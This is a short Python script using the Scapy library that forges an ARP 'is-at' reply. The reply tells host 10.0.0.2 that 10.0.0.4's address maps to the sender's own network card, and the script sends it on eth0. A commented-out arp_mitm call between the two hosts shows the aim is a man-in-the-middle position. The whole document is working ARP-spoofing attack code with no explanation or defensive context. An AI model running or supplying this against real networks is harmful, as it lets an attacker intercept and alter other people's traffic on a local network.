from scapy.all import *

frame = Ether(src=get_if_hwaddr("eth0"))/ARP(hwsrc=get_if_hwaddr("eth0"),op='is-at', psrc='10.0.0.4', pdst='10.0.0.2')
srp(frame, iface='eth0')
# arp_mitm("10.0.0.2", "10.0.0.4")